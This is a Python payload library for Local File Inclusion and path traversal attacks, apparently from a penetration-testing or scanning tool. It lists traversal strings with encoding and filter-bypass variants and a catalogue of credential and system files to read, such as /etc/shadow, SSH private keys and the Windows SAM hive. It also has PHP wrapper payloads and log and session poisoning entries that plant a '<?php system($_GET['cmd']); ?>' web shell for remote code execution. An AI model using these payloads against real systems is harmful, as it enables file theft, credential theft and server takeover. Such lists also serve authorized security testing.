"""
Local File Inclusion (LFI) and Path Traversal Payloads
Includes PHP wrappers and bypass techniques
"""

LFI_PAYLOADS = {
    "basic": [
        # Simple path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "....\\....\\....\\windows\\win.ini",

        # Different depths
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
    ],

    "null_byte": [
        # Null byte injection (works on PHP < 5.3.4)
        "../../../etc/passwd%00",
        "../../../etc/passwd\\x00",
        "../../../etc/passwd%00.php",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd\\0",
    ],

    "encoding": [
        # URL encoding
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",

        # Double URL encoding
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",

        # UTF-8 encoding
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%c1%9c..%c1%9c..%c1%9cetc/passwd",

        # Unicode encoding
        "..%u2215..%u2215..%u2215etc/passwd",
        "..%u2216..%u2216..%u2216windows/win.ini",
    ],

    "bypass": [
        # Filter bypass variations
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "..///////..////..//////etc/passwd",
        "/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",

        # With valid extension
        "../../../etc/passwd%00.php",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.png",
        "../../../etc/passwd\\.php",

        # Case variations
        "..\\..\\..\\WINDOWS\\win.ini",
        "../../../ETC/PASSWD",

        # Dot variations
        "..././..././..././etc/passwd",
        ".../.../.../.../etc/passwd",

        # Backslash variations (Windows)
        "..\\..\\..\\etc\\passwd",
        "..\\..\\..\\windows\\win.ini",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
    ],

    "absolute_path": [
        # Absolute paths
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/etc/group",
        "/etc/crontab",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/etc/ssh/sshd_config",
        "/etc/mysql/my.cnf",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/www/html/index.php",
        "/var/www/html/config.php",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/version",
        "/proc/mounts",
        "/proc/net/tcp",
        "/proc/net/udp",

        # Windows
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\boot.ini",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
        "C:\\xampp\\apache\\logs\\access.log",
        "C:\\xampp\\apache\\logs\\error.log",
    ],

    "interesting_files": {
        "linux": [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/group",
            "/etc/hosts",
            "/etc/motd",
            "/etc/issue",
            "/etc/ssh/ssh_config",
            "/etc/ssh/sshd_config",
            "/root/.bash_history",
            "/root/.ssh/authorized_keys",
            "/root/.ssh/id_rsa",
            "/root/.ssh/id_dsa",
            "/var/mail/root",
            "/var/spool/cron/crontabs/root",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/maps",
            "/proc/sched_debug",
            "/home/*/.bash_history",
            "/home/*/.ssh/id_rsa",
        ],

        "windows": [
            "C:\\Windows\\win.ini",
            "C:\\boot.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\SECURITY",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\Windows\\debug\\NetSetup.log",
            "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
            "C:\\xampp\\apache\\conf\\httpd.conf",
            "C:\\xampp\\mysql\\bin\\my.ini",
            "C:\\xampp\\php\\php.ini",
        ],

        "webapp_config": [
            ".env",
            "config.php",
            "configuration.php",
            "wp-config.php",
            "config/database.yml",
            "config/secrets.yml",
            "app/config/parameters.yml",
            "config/config.php",
            "includes/config.php",
            "application/config/database.php",
            "settings.py",
            "local_settings.py",
            "config.py",
            "config.js",
            ".htpasswd",
            ".htaccess",
            "web.config",
        ],

        "logs": [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/access.log",
            "/var/log/apache/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/mail.log",
            "/var/log/mysql/error.log",
            "/var/log/postgresql/postgresql.log",
        ],
    },
}

# PHP Wrappers for advanced LFI exploitation
LFI_WRAPPERS = {
    "php_filter": [
        # Base64 encode to read PHP source
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/read=convert.base64-encode/resource=../config.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",

        # Chain to bypass filters
        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php",
    ],

    "php_input": [
        # Requires allow_url_include=On
        "php://input",  # POST data: <?php system('id'); ?>
    ],

    "data": [
        # Data URI wrapper
        "data://text/plain,<?php system('id'); ?>",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        "data:text/plain,<?php phpinfo(); ?>",
    ],

    "expect": [
        # Requires expect extension
        "expect://id",
        "expect://ls",
        "expect://whoami",
    ],

    "zip": [
        # ZIP wrapper for shell upload
        "zip://shell.jpg#shell.php",
        "zip:///var/www/uploads/shell.jpg#shell.php",
    ],

    "phar": [
        # Phar wrapper (useful for deserialization)
        "phar://./shell.jpg",
        "phar://./uploads/image.png/shell.php",
    ],

    "file": [
        # File wrapper (explicit)
        "file:///etc/passwd",
        "file://C:/Windows/win.ini",
    ],

    "proc_self": [
        # /proc/self tricks
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/self/fd/10",
        "/proc/self/fd/11",
        "/proc/self/fd/12",
        "/proc/self/cwd/index.php",
        "/proc/self/cwd/config.php",
    ],
}

# LFI to RCE techniques
LFI_TO_RCE = {
    "log_poisoning": {
        "apache_access": "/var/log/apache2/access.log",
        "apache_error": "/var/log/apache2/error.log",
        "nginx_access": "/var/log/nginx/access.log",
        "nginx_error": "/var/log/nginx/error.log",
        "ssh_auth": "/var/log/auth.log",
        "mail": "/var/log/mail.log",
        "payload": "<?php system($_GET['cmd']); ?>",
        "user_agent_payload": "<?php system($_GET['cmd']); ?>",
    },

    "session_files": {
        "paths": [
            "/var/lib/php/sessions/sess_SESSIONID",
            "/var/lib/php5/sess_SESSIONID",
            "/tmp/sess_SESSIONID",
            "/var/tmp/sess_SESSIONID",
            "C:\\Windows\\Temp\\sess_SESSIONID",
        ],
        "payload": "<?php system($_GET['cmd']); ?>",
    },

    "environ": {
        "path": "/proc/self/environ",
        "user_agent_payload": "<?php system($_GET['cmd']); ?>",
    },

    "mail": {
        "path": "/var/mail/www-data",
        "payload": "<?php system($_GET['cmd']); ?>",
    },
}
